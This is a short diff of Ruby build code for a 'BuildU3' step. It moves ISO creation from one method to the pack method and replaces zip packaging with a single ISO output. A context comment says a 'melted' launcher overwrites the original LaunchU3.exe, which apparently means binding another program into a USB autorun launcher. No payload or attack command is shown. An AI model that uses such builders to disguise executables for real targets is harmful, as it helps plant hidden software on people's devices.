@@ -41,24 +41,16 @@ class BuildU3 < Build
     # overwrite the original launcher with the melted one
     FileUtils.mv path('output'), path('u3/LaunchU3.exe')
 
-    # create the ISO image
-    CrossPlatform.exec path('oscdimg'), "-j1 -lU3 #{path('u3')} #{path('output.iso')}"
-    raise "ISO creation failed" unless File.exist? path('output.iso')
-
-    @outputs = ['output.iso']
   end
 
   def pack(params)
     trace :debug, "Build: pack: #{params}"
 
-    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
-      @outputs.each do |out|
-        z.file.open(out, "w") { |f| f.write File.open(path(out), 'rb') {|f| f.read} }
-      end
-    end
+    # create the ISO image
+    CrossPlatform.exec path('oscdimg'), "-j1 -lU3 #{path('u3')} #{path('output.iso')}"
+    raise "ISO creation failed" unless File.exist? path('output.iso')
 
-    # this is the only file we need to output after this point
-    @outputs = ['output.zip']
+    @outputs = ['output.iso']
   end
 
 end
